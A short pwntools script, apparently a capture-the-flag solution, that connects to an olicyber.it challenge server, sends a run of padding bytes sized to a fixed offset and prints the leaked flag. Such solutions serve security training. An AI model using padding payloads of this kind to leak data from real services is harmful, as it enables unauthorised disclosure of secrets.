from pwn import *

FLAG_OFFSET = 0x14

def connect():
    if args.LOCAL:
        r = process(["./lilof"])
    else:
        r = remote('thewall.challs.olicyber.it', 21007)
    return r

conn = connect()

conn.recvuntil(b"Choose an option:") # Skip intro


conn.sendline(b"1")
conn.recvline()
payload = (b"?" * (FLAG_OFFSET-1))
print("[*] Sending: {}".format(payload))
conn.sendline(payload)

conn.recvuntil(b"Choose an option:")

conn.sendline(b"2")
conn.recvline(); conn.recvline()
flag = conn.recvline().decode()

print("[+] FLAG: {}".format(flag))

conn.close()